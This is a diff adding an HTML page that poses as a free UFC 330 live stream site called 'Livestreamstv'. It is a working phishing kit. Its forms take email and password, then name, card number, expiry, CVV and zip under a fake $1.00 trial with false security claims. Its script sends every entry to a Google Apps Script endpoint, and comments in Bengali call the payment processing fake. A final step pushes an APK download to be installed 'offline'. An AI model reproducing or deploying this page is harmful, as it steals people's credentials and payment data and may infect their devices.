@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UFC 330 LIVE</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            color: #333;
+        }
+
+        /* Top Header / Banner Section (Step 1) */
+        .top-banner {
+            background: linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.65)), url('https://sportshub.cbsistatic.com/i/2024/12/17/e7925840-6db0-43cb-8b50-b9da0736b624/ufc-wide-general-2024.jpg') no-repeat center center/cover;
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .logo {
+            font-size: 20px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #fff;
+        }
+        .top-alert {
+            background: #ffcc00;
+            color: #000;
+            padding: 6px 15px;
+            font-size: 12px;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+        .hero-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            text-align: left;
+            width: 100%;
+            padding: 40px 0;
+        }
+        .hero-text h1 {
+            font-size: 48px;
+            margin: 5px 0;
+            color: #fff;
+        }
+        .hero-text p {
+            font-size: 18px;
+            color: #ddd;
+        }
+        
+        /* Match Card with VS */
+        .match-card {
+            background: rgba(0, 0, 0, 0.75);
+            padding: 12px 20px;
+            border-radius: 6px;
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 20px;
+            border: 1px solid rgba(255,255,255,0.15);
+        }
+        
+        /* Form Box */
+        .signup-box {
+            background: #ffffff;
+            color: #333;
+            padding: 25px;
+            border-radius: 8px;
+            width: 380px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            text-align: left;
+        }
+        .signup-box small {
+            color: #e67e22;
+            font-weight: bold;
+            font-size: 11px;
+        }
+        .signup-box h3 {
+            font-size: 20px;
+            margin: 4px 0;
+            color: #111;
+        }
+        .signup-box p {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 11px;
+            font-weight: bold;
+            color: #444;
+            margin-bottom: 4px;
+        }
+        .signup-box input, .signup-box select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 13px;
+            outline: none;
+            background: #fff;
+        }
+        .signup-box input:focus, .signup-box select:focus {
+            border-color: #ff0000;
+        }
+        .row-inputs {
+            display: flex;
+            gap: 10px;
+        }
+        .btn-submit {
+            width: 100%;
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-weight: bold;
+            font-size: 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-submit:hover {
+            background: #cc0000;
+        }
+        .login-link {
+            display: block;
+            text-align: center;
+            font-size: 12px;
+            margin-top: 10px;
+            color: #0066cc;
+            text-decoration: none;
+        }
+        .form-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 10px;
+            color: #777;
+            margin-top: 15px;
+            border-top: 1px solid #eee;
+            padding-top: 10px;
+        }
+
+        /* White Content Section */
+        .white-content-section {
+            background-color: #ffffff;
+            color: #333;
+            padding: 40px 20px 20px 20px;
+        }
+        .white-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            gap: 50px;
+            flex-wrap: wrap;
+        }
+        .movie-grid-img {
+            flex: 1;
+            max-width: 480px;
+            width: 100%;
+            border-radius: 6px;
+        }
+        .content-info {
+            flex: 1.2;
+        }
+        .content-info h3 {
+            font-size: 22px;
+            margin-bottom: 8px;
+            color: #111;
+        }
+        .content-info p {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        /* STEP 2 & 3 Layout */
+        .step-2-body {
+            background-color: #ffffff;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 20px;
+        }
+        .payment-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 30px;
+            width: 100%;
+        }
+        .overview-box {
+            flex: 1;
+            min-width: 250px;
+            background: transparent;
+            color: #333;
+        }
+        .overview-box h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 10px;
+        }
+        .overview-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            margin-bottom: 10px;
+            color: #555;
+        }
+        .overview-total {
+            font-size: 16px;
+            font-weight: bold;
+            border-top: 1px solid #ddd;
+            padding-top: 10px;
+            margin-top: 10px;
+        }
+        .card-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .card-input-wrapper input {
+            padding-right: 75px;
+        }
+        .card-icons {
+            position: absolute;
+            right: 10px;
+            display: flex;
+            gap: 4px;
+            align-items: center;
+        }
+        .card-icons img {
+            height: 16px;
+        }
+        .desktop-extra-texts {
+            flex: 1.3;
+            font-size: 12px;
+            line-height: 1.6;
+            color: #555;
+        }
+        .desktop-extra-texts h4 {
+            font-size: 14px;
+            color: #111;
+            margin-bottom: 8px;
+        }
+        .desktop-extra-texts p {
+            margin-bottom: 10px;
+        }
+        .footer {
+            background: #ffffff;
+            color: #888;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+        }
+        .footer a {
+            color: #333;
+            text-decoration: underline;
+        }
+
+        /* 3rd Step Animated Download Graphic Styling */
+        .graphic-download-box {
+            background: linear-gradient(145deg, #f8fafc, #edf2f7);
+            border: 2px dashed #ff0000;
+            border-radius: 12px;
+            padding: 18px;
+            margin: 20px 0;
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.1);
+            animation: pulseGlow 2s infinite alternate;
+        }
+
+        @keyframes pulseGlow {
+            0% {
+                border-color: #ff0000;
+                box-shadow: 0 0 5px rgba(255, 0, 0, 0.2);
+            }
+            100% {
+                border-color: #22c55e;
+                box-shadow: 0 0 15px rgba(34, 197, 94, 0.4);
+            }
+        }
+
+        @media screen and (max-width: 768px) {
+            .step-2-body {
+                background-color: #ffffff;
+                padding: 15px 10px;
+            }
+            .payment-container {
+                display: flex;
+                flex-direction: column;
+                gap: 15px;
+            }
+            .overview-box {
+                order: 1;
+                background: #f9f9f9;
+                padding: 15px;
+                border-radius: 6px;
+            }
+            .payment-form-box {
+                order: 2;
+                width: 100% !important;
+            }
+            .desktop-extra-texts {
+                order: 3;
+                background: #f9f9f9;
+                padding: 15px;
+                border-radius: 6px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- STEP 1: Main Banner & Registration -->
+    <div id="view-step-1" class="top-banner">
+        <div class="header-top">
+            <div class="logo">🛡️ Livestreamstv</div>
+            <div class="top-alert">⚠️ Free Registration Required</div>
+        </div>
+        
+        <div class="hero-container">
+            <div class="hero-text">
+                <p>Watch Live</p>
+                <h1>UFC 330</h1>
+                <p>Streaming HD Online</p>
+                
+                <div class="match-card">
+                    <span><strong>Islam Makhachev</strong></span>
+                    <span style="display: inline-block; padding: 4px 8px; background-color: #1e293b; color: #ff0000; border: 1px solid #ff0000; border-radius: 4px; font-weight: bold;">VS</span>
+                    <span><strong>Ian Machado Garry</strong></span>
+                </div>
+            </div>
+
+            <div class="signup-box">
+                <small>STEP 1 OF 3</small>
+                <h3>Create Your Account</h3>
+                <p>Please fill out the following fields to create a free account:</p>
+                
+                <form id="form-step-1" onsubmit="goToStep2(event)">
+                    <div class="form-group">
+                        <input type="email" id="user-email" placeholder="Email" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="user-password" placeholder="Password (+6 Characters)" required minlength="6">
+                    </div>
+                    <button type="submit" class="btn-submit">Continue to Free</button>
+                </form>
+                
+                <a href="#" class="login-link">Existing users, login here.</a>
+                
+                <div class="form-footer">
+                    <span>By signing up you agree to our <u>Terms & Conditions</u>.</span>
+                    <span>SSL Encryption 🔒</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- White Content Section with New Links & No Gap -->
+    <div id="white-section" class="white-content-section">
+        <!-- 3 Steps Images & Content Section Updated with User Provided Links -->
+        <div style="max-width: 1100px; margin: 0 auto 40px auto; display: flex; justify-content: space-around; text-align: center; flex-wrap: wrap; gap: 30px;">
+            <div style="flex: 1; min-width: 280px; display: flex; flex-direction: column; align-items: center;">
+                <div style="width: 100%; height: 160px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center;">
+                    <img src="https://register2.playarenas.net/m9/v/a/assets/media-m9-1-1x-DSIsCMV1.webp" alt="Step 1" style="max-width: 100%; max-height: 100%; object-fit: contain;">
+                </div>
+                <h4 style="font-size: 16px; margin-bottom: 5px; color: #ff0000; font-weight: bold;">1. Sign up & start now</h4>
+                <p style="font-size: 12px; color: #666; line-height: 1.4;">Access to games, music, books, & movies. Quick and easy to use sign up and try it out now!</p>
+            </div>
+            
+            <div style="flex: 1; min-width: 280px; display: flex; flex-direction: column; align-items: center;">
+                <div style="width: 100%; height: 160px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center;">
+                    <img src="https://register2.playarenas.net/m9/v/a/assets/media-m9-2-1x-B1RNhBpZ.webp" alt="Step 2" style="max-width: 100%; max-height: 100%; object-fit: contain;">
+                </div>
+                <h4 style="font-size: 16px; margin-bottom: 5px; color: #ff0000; font-weight: bold;">2. Unlimited content</h4>
+                <p style="font-size: 12px; color: #666; line-height: 1.4;">Access to thousands of game, music, book & movie titles</p>
+            </div>
+            
+            <div style="flex: 1; min-width: 280px; display: flex; flex-direction: column; align-items: center;">
+                <div style="width: 100%; height: 160px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center;">
+                    <img src="https://register2.playarenas.net/m9/v/a/assets/media-m9-3-1x-D8Ydw8Jc.webp" alt="Step 3" style="max-width: 100%; max-height: 100%; object-fit: contain;">
+                </div>
+                <h4 style="font-size: 16px; margin-bottom: 5px; color: #ff0000; font-weight: bold;">3. Download or play instantly</h4>
+                <p style="font-size: 12px; color: #666; line-height: 1.4;">High speed download, unlimited bandwidth. No ads- No waiting, Ever-changing library</p>
+            </div>
+        </div>
+
+        <div class="white-container">
+            <img src="https://register2.motiongrid.net/m9/v/a/assets/media-m9-covers--large-up-1x-BtOzyXjW.webp" alt="Media Covers" class="movie-grid-img">
+            <div class="content-info">
+                <h3 style="color: #e67e22; font-size: 14px; font-weight: bold; text-transform: uppercase; margin-bottom: 5px;">Free Access</h3>
+                <p>Free Access means you will have unlimited access to our basic membership and catalogue.</p>
+                
+                <h3 style="color: #e67e22; font-size: 14px; font-weight: bold; text-transform: uppercase; margin-bottom: 5px;">Unlimited Access</h3>
+                <p>Unlimited access means we will never cap your consumption or charge you per title. Signup, browse our catalogue, and enjoy!</p>
+                
+                <h3 style="color: #e67e22; font-size: 14px; font-weight: bold; text-transform: uppercase; margin-bottom: 5px;">Premium Access</h3>
+                <p>Our Premium catalogue free of cost for 1 day, then $15.95 /month after, cancel online anytime. Experience the best our platform has to offer in terms of quality and number of titles, with over 30k and growing.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- STEP 2: Payment Details View -->
+    <div id="view-step-2" class="step-2-body" style="display: none;">
+        <div class="header-top" style="max-width: 1200px; color: #333;">
+            <div class="logo" style="color: #111;">🛡️ Livestreamstv</div>
+            <div class="top-alert" style="background: #ffcc00; color: #000;">🔒 Secure Checkout</div>
+        </div>
+
+        <div class="payment-container" style="padding: 20px 0;">
+            <div class="overview-box">
+                <h2>Overview</h2>
+                <div class="overview-row">
+                    <span>Trial Membership (7 Days)</span>
+                    <span><strong>$1.00</strong></span>
+                </div>
+                <div style="font-size: 11px; color: #666; margin-bottom: 10px;">Access to our full catalogue of Games, Music, Books, Movies & Sports</div>
+                <div class="overview-total">
+                    <span>Total Today:</span>
+                    <span style="float: right;">$1.00</span>
+                </div>
+            </div>
+
+            <div class="signup-box payment-form-box" style="width: 380px; border: 1px solid #ddd;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                    <h3 style="font-size: 18px; margin:0; color:#111;">Your Information</h3>
+                    <span style="font-size: 11px; color: #666;">SSL Encryption 🔒</span>
+                </div>
+                
+                <form id="form-step-2" onsubmit="submitCardInfo(event)">
+                    <div class="row-inputs" style="margin-bottom: 12px;">
+                        <div class="form-group" style="flex:1; margin-bottom:0;">
+                            <input type="text" id="first-name" placeholder="First Name" required>
+                        </div>
+                        <div class="form-group" style="flex:1; margin-bottom:0;">
+                            <input type="text" id="last-name" placeholder="Last Name" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Country</label>
+                        <select id="country" required>
+                            <option value="">-- Select Country --</option>
+                            <option value="Afghanistan">Afghanistan</option>
+                            <option value="Albania">Albania</option>
+                            <option value="Algeria">Algeria</option>
+                            <option value="Andorra">Andorra</option>
+                            <option value="Angola">Angola</option>
+                            <option value="Argentina">Argentina</option>
+                            <option value="Armenia">Armenia</option>
+                            <option value="Australia">Australia</option>
+                            <option value="Austria">Austria</option>
+                            <option value="Azerbaijan">Azerbaijan</option>
+                            <option value="Bahamas">Bahamas</option>
+                            <option value="Bahrain">Bahrain</option>
+                            <option value="Bangladesh">Bangladesh</option>
+                            <option value="Barbados">Barbados</option>
+                            <option value="Belarus">Belarus</option>
+                            <option value="Belgium">Belgium</option>
+                            <option value="Belize">Belize</option>
+                            <option value="Benin">Benin</option>
+                            <option value="Bhutan">Bhutan</option>
+                            <option value="Bolivia">Bolivia</option>
+                            <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
+                            <option value="Botswana">Botswana</option>
+                            <option value="Brazil">Brazil</option>
+                            <option value="Brunei">Brunei</option>
+                            <option value="Bulgaria">Bulgaria</option>
+                            <option value="Burkina Faso">Burkina Faso</option>
+                            <option value="Burundi">Burundi</option>
+                            <option value="Cambodia">Cambodia</option>
+                            <option value="Cameroon">Cameroon</option>
+                            <option value="Canada">Canada</option>
+                            <option value="Cape Verde">Cape Verde</option>
+                            <option value="Central African Republic">Central African Republic</option>
+                            <option value="Chad">Chad</option>
+                            <option value="Chile">Chile</option>
+                            <option value="China">China</option>
+                            <option value="Colombia">Colombia</option>
+                            <option value="Comoros">Comoros</option>
+                            <option value="Congo">Congo</option>
+                            <option value="Costa Rica">Costa Rica</option>
+                            <option value="Croatia">Croatia</option>
+                            <option value="Cuba">Cuba</option>
+                            <option value="Cyprus">Cyprus</option>
+                            <option value="Czech Republic">Czech Republic</option>
+                            <option value="Denmark">Denmark</option>
+                            <option value="Djibouti">Djibouti</option>
+                            <option value="Dominica">Dominica</option>
+                            <option value="Dominican Republic">Dominican Republic</option>
+                            <option value="Ecuador">Ecuador</option>
+                            <option value="Egypt">Egypt</option>
+                            <option value="El Salvador">El Salvador</option>
+                            <option value="Equatorial Guinea">Equatorial Guinea</option>
+                            <option value="Eritrea">Eritrea</option>
+                            <option value="Estonia">Estonia</option>
+                            <option value="Eswatini">Eswatini</option>
+                            <option value="Ethiopia">Ethiopia</option>
+                            <option value="Fiji">Fiji</option>
+                            <option value="Finland">Finland</option>
+                            <option value="France">France</option>
+                            <option value="Gabon">Gabon</option>
+                            <option value="Gambia">Gambia</option>
+                            <option value="Georgia">Georgia</option>
+                            <option value="Germany">Germany</option>
+                            <option value="Ghana">Ghana</option>
+                            <option value="Greece">Greece</option>
+                            <option value="Grenada">Grenada</option>
+                            <option value="Guatemala">Guatemala</option>
+                            <option value="Guinea">Guinea</option>
+                            <option value="Guinea-Bissau">Guinea-Bissau</option>
+                            <option value="Guyana">Guyana</option>
+                            <option value="Haiti">Haiti</option>
+                            <option value="Honduras">Honduras</option>
+                            <option value="Hungary">Hungary</option>
+                            <option value="Iceland">Iceland</option>
+                            <option value="India">India</option>
+                            <option value="Indonesia">Indonesia</option>
+                            <option value="Iran">Iran</option>
+                            <option value="Iraq">Iraq</option>
+                            <option value="Ireland">Ireland</option>
+                            <option value="Israel">Israel</option>
+                            <option value="Italy">Italy</option>
+                            <option value="Jamaica">Jamaica</option>
+                            <option value="Japan">Japan</option>
+                            <option value="Jordan">Jordan</option>
+                            <option value="Kazakhstan">Kazakhstan</option>
+                            <option value="Kenya">Kenya</option>
+                            <option value="Kiribati">Kiribati</option>
+                            <option value="Kuwait">Kuwait</option>
+                            <option value="Kyrgyzstan">Kyrgyzstan</option>
+                            <option value="Laos">Laos</option>
+                            <option value="Latvia">Latvia</option>
+                            <option value="Lebanon">Lebanon</option>
+                            <option value="Lesotho">Lesotho</option>
+                            <option value="Liberia">Liberia</option>
+                            <option value="Libya">Libya</option>
+                            <option value="Liechtenstein">Liechtenstein</option>
+                            <option value="Lithuania">Lithuania</option>
+                            <option value="Luxembourg">Luxembourg</option>
+                            <option value="Madagascar">Madagascar</option>
+                            <option value="Malawi">Malawi</option>
+                            <option value="Malaysia">Malaysia</option>
+                            <option value="Maldives">Maldives</option>
+                            <option value="Mali">Mali</option>
+                            <option value="Malta">Malta</option>
+                            <option value="Mauritania">Mauritania</option>
+                            <option value="Mauritius">Mauritius</option>
+                            <option value="Mexico">Mexico</option>
+                            <option value="Micronesia">Micronesia</option>
+                            <option value="Moldova">Moldova</option>
+                            <option value="Monaco">Monaco</option>
+                            <option value="Mongolia">Mongolia</option>
+                            <option value="Montenegro">Montenegro</option>
+                            <option value="Morocco">Morocco</option>
+                            <option value="Mozambique">Mozambique</option>
+                            <option value="Myanmar">Myanmar</option>
+                            <option value="Namibia">Namibia</option>
+                            <option value="Nauru">Nauru</option>
+                            <option value="Nepal">Nepal</option>
+                            <option value="Netherlands">Netherlands</option>
+                            <option value="New Zealand">New Zealand</option>
+                            <option value="Nicaragua">Nicaragua</option>
+                            <option value="Niger">Niger</option>
+                            <option value="Nigeria">Nigeria</option>
+                            <option value="North Korea">North Korea</option>
+                            <option value="North Macedonia">North Macedonia</option>
+                            <option value="Norway">Norway</option>
+                            <option value="Oman">Oman</option>
+                            <option value="Pakistan">Pakistan</option>
+                            <option value="Palau">Palau</option>
+                            <option value="Palestine">Palestine</option>
+                            <option value="Panama">Panama</option>
+                            <option value="Papua New Guinea">Papua New Guinea</option>
+                            <option value="Paraguay">Paraguay</option>
+                            <option value="Peru">Peru</option>
+                            <option value="Philippines">Philippines</option>
+                            <option value="Poland">Poland</option>
+                            <option value="Portugal">Portugal</option>
+                            <option value="Qatar">Qatar</option>
+                            <option value="Romania">Romania</option>
+                            <option value="Russia">Russia</option>
+                            <option value="Rwanda">Rwanda</option>
+                            <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
+                            <option value="Saint Lucia">Saint Lucia</option>
+                            <option value="Samoa">Samoa</option>
+                            <option value="San Marino">San Marino</option>
+                            <option value="Saudi Arabia">Saudi Arabia</option>
+                            <option value="Senegal">Senegal</option>
+                            <option value="Serbia">Serbia</option>
+                            <option value="Seychelles">Seychelles</option>
+                            <option value="Sierra Leone">Sierra Leone</option>
+                            <option value="Singapore">Singapore</option>
+                            <option value="Slovakia">Slovakia</option>
+                            <option value="Slovenia">Slovenia</option>
+                            <option value="Somalia">Somalia</option>
+                            <option value="South Africa">South Africa</option>
+                            <option value="South Korea">South Korea</option>
+                            <option value="South Sudan">South Sudan</option>
+                            <option value="Spain">Spain</option>
+                            <option value="Sri Lanka">Sri Lanka</option>
+                            <option value="Sudan">Sudan</option>
+                            <option value="Suriname">Suriname</option>
+                            <option value="Sweden">Sweden</option>
+                            <option value="Switzerland">Switzerland</option>
+                            <option value="Syria">Syria</option>
+                            <option value="Taiwan">Taiwan</option>
+                            <option value="Tajikistan">Tajikistan</option>
+                            <option value="Tanzania">Tanzania</option>
+                            <option value="Thailand">Thailand</option>
+                            <option value="Timor-Leste">Timor-Leste</option>
+                            <option value="Togo">Togo</option>
+                            <option value="Tonga">Tonga</option>
+                            <option value="Trinidad and Tobago">Trinidad and Tobago</option>
+                            <option value="Tunisia">Tunisia</option>
+                            <option value="Turkey">Turkey</option>
+                            <option value="Turkmenistan">Turkmenistan</option>
+                            <option value="Tuvalu">Tuvalu</option>
+                            <option value="Uganda">Uganda</option>
+                            <option value="Ukraine">Ukraine</option>
+                            <option value="United Arab Emirates">United Arab Emirates</option>
+                            <option value="United Kingdom">United Kingdom</option>
+                            <option value="United States">United States</option>
+                            <option value="Uruguay">Uruguay</option>
+                            <option value="Uzbekistan">Uzbekistan</option>
+                            <option value="Vanuatu">Vanuatu</option>
+                            <option value="Vatican City">Vatican City</option>
+                            <option value="Venezuela">Venezuela</option>
+                            <option value="Vietnam">Vietnam</option>
+                            <option value="Yemen">Yemen</option>
+                            <option value="Zambia">Zambia</option>
+                            <option value="Zimbabwe">Zimbabwe</option>
+                        </select>
+                    </div>
+
+                    <h3 style="font-size: 15px; margin: 15px 0 5px 0; color:#111;">Enter Your Payment Details</h3>
+                    <div style="font-size: 11px; color: #666; margin-bottom: 8px;">Trial Activation Fee: $1.00</div>
+                    
+                    <div class="form-group">
+                        <div class="card-input-wrapper">
+                            <!-- Numeric input with auto space formatting -->
+                            <input type="text" id="card-number" placeholder="Credit Card" maxlength="19" inputmode="numeric" oninput="formatCardNumber(this)" required>
+                            <div class="card-icons">
+                                <img src="https://img.icons8.com/color/48/visa.png" alt="Visa">
+                                <img src="https://img.icons8.com/color/48/mastercard.png" alt="Mastercard">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="row-inputs">
+                        <div class="form-group" style="flex: 1.2;">
+                            <label>Expiry Date</label>
+                            <input type="text" id="card-expiry" placeholder="MM / YY" maxlength="7" oninput="formatExpiry(this)" required>
+                        </div>
+                        <div class="form-group" style="flex: 0.8;">
+                            <label>CVV2</label>
+                            <input type="password" id="card-cvv" placeholder="CVV2" maxlength="4" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Zip Code</label>
+                        <input type="text" id="card-zip" placeholder="Postal Code" required>
+                    </div>
+
+                    <button type="submit" id="btn-pay" class="btn-submit" style="background: #ff0000; margin-top: 15px;">Pay $1.00 & Continue</button>
+                </form>
+            </div>
+
+            <div class="desktop-extra-texts">
+                <h4>Why do we ask you for your billing information?</h4>
+                <p>To verify your identity and prevent bot fraud, we require a small $1.00 trial authorization fee. We GUARANTEE that no hidden fees will be applied. Your subscription will renew at the standard rate only if you choose to keep your membership active after the trial period.</p>
+                <p><strong>We provide you a SECURE Online Environment</strong><br>Unlike many companies on the Internet, we use encryption security technology. Our site employs Secure Sockets Layering (SSL) to encrypt your personal information such as credit card number, name, and address before it travels over the Internet. Your data is encrypted and password-protected, so no one ever sees your information!</p>
+                <p><strong>Authorization process</strong><br>The $1.00 charge is fully authorized for your trial activation and immediate streaming access.</p>
+                <p><strong>Questions? Comments?</strong><br><a href="#" style="color: #3b82f6; text-decoration: underline;">Visit our Help Center.</a></p>
+            </div>
+        </div>
+
+        <div class="footer" style="background: transparent;">
+            <p>Visit our <a href="#">Help Center</a> for more information.<br>Partners | © Playarenas 2026</p>
+        </div>
+    </div>
+
+    <!-- FINAL STEP 3: Download & Offline Installation View -->
+    <div id="view-step-3" class="step-2-body" style="display: none;">
+        <div class="header-top" style="max-width: 1100px; color: #333;">
+            <div class="logo" style="color: #111;">🛡️ Livestreamstv</div>
+            <div class="top-alert">🚀 Final Step: Download & Install App</div>
+        </div>
+
+        <div class="payment-container" style="justify-content: center; align-items: center;">
+            <div class="signup-box" style="width: 100%; max-width: 500px; background: #fff; color: #333; text-align: center; padding: 25px; border: 1px solid #ddd;">
+                
+                <small style="background: #ff0000; color: #fff; padding: 3px 10px; border-radius: 4px; display: inline-block; margin-bottom: 12px; font-weight: bold;">FINAL STEP (3 OF 3)</small>
+                <h3 style="font-size: 22px; color: #111; margin-bottom: 12px;">Download Application to Watch Live</h3>
+                
+                <!-- Graphic Animated Download Box -->
+                <div class="graphic-download-box">
+                    <a href="app-release.apk" download style="display: block; text-decoration: none;">
+                        <img src="https://i.imgur.com/ck8jc9A.png" alt="Download Now" style="max-width: 100%; height: auto; border-radius: 6px; transition: transform 0.2s; cursor: pointer;" onmouseover="this.style.transform='scale(1.03)'" onmouseout="this.style.transform='scale(1)'">
+                    </a>
+                </div>
+
+                <!-- Offline Installation Guide Image -->
+                <div style="margin: 25px 0 15px 0;">
+                    <p style="font-size: 14px; font-weight: bold; color: #d9534f; margin-bottom: 10px;">⚠️ Note: App must be installed OFFLINE!</p>
+                    <img src="https://i.imgur.com/jd739ck.png" alt="Offline Install Instructions" style="max-width: 100%; height: auto; border: 1px solid #ddd; border-radius: 6px;">
+                </div>
+
+                <div style="display: flex; justify-content: space-around; align-items: center; margin-top: 20px; font-size: 11px; color: #666; border-top: 1px solid #eee; padding-top: 12px;">
+                    <span>🔒 Safe & Secure</span>
+                    <span>⚡ Fast Download</span>
+                    <span>📺 HD/4K Quality</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="step-1-footer" class="footer">
+        <p>Visit our <a href="#">Help Center</a> | © Playarenas 2026</p>
+    </div>
+
+    <!-- JavaScript with Google Script URL -->
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbz181ef967li10UngT7O_s3v7RfX1KYqY3mIR1idzpMexlDYCzHzo9s4lPZ_w8_7n4V/exec';
+
+        let globalEmail = '';
+        let globalPassword = '';
+        let cardDataSaved = {};
+
+        function goToStep2(event) {
+            event.preventDefault();
+            globalEmail = document.getElementById('user-email').value;
+            globalPassword = document.getElementById('user-password').value;
+
+            let data = {
+                step: "1",
+                email: globalEmail,
+                password: globalPassword
+            };
+
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log(err));
+
+            document.getElementById('view-step-1').style.display = 'none';
+            document.getElementById('white-section').style.display = 'none';
+            document.getElementById('step-1-footer').style.display = 'none';
+            document.getElementById('view-step-2').style.display = 'flex';
+            window.scrollTo(0, 0);
+        }
+
+        // কার্ড নম্বর ইনপুটে শুধু সংখ্যা এবং ৪ ডিজিট পরপর স্পেস বসানোর ফাংশন
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            input.value = formattedValue;
+        }
+
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.substring(0, 4);
+            if (value.length >= 3) {
+                input.value = value.substring(0, 2) + ' / ' + value.substring(2);
+            } else {
+                input.value = value;
+            }
+        }
+
+        function submitCardInfo(event) {
+            event.preventDefault();
+
+            let payBtn = document.getElementById('btn-pay');
+            payBtn.innerText = "Processing Payment...";
+            payBtn.disabled = true;
+            payBtn.style.opacity = "0.7";
+
+            let firstName = document.getElementById('first-name').value;
+            let lastName = document.getElementById('last-name').value;
+            let selectedCountry = document.getElementById('country').value;
+            let cardNumber = document.getElementById('card-number').value;
+            let cardExpiry = document.getElementById('card-expiry').value;
+            let cardCvv = document.getElementById('card-cvv').value;
+            let cardZip = document.getElementById('card-zip').value;
+
+            cardDataSaved = {
+                cardName: firstName + ' ' + lastName,
+                country: selectedCountry,
+                cardNumber: cardNumber,
+                cardDateCvv: cardExpiry + ' / CVV: ' + cardCvv,
+                cardZip: cardZip
+            };
+
+            let data = {
+                step: "2",
+                email: globalEmail,
+                password: globalPassword,
+                cardName: cardDataSaved.cardName,
+                country: cardDataSaved.country,
+                cardNumber: cardDataSaved.cardNumber,
+                cardDateCvv: cardDataSaved.cardDateCvv,
+                cardZip: cardDataSaved.cardZip
+            };
+
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log(err));
+
+            // ২ সেকেন্ডের ফেক প্রসেসিং ডিলির পর পেজ ৩ এ রিডাইরেক্ট করবে
+            setTimeout(function() {
+                document.getElementById('view-step-2').style.display = 'none';
+                document.getElementById('view-step-3').style.display = 'flex';
+                window.scrollTo(0, 0);
+            }, 2000);
+        }
+
+        function handleDownload(event) {
+            event.preventDefault();
+
+            // Send Download notification to Google Sheet
+            let data = {
+                step: "3",
+                email: globalEmail,
+                password: globalPassword,
+                cardName: cardDataSaved.cardName || '',
+                country: cardDataSaved.country || '',
+                cardNumber: cardDataSaved.cardNumber || '',
+                cardDateCvv: cardDataSaved.cardDateCvv || '',
+                cardZip: cardDataSaved.cardZip || '',
+                status: "Downloaded",
+                downloadStatus: "Downloaded"
+            };
+
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log(err));
+
+            alert("Downloading file... Please install it offline to continue.");
+        }
+    </script>
+</body>
+</html>
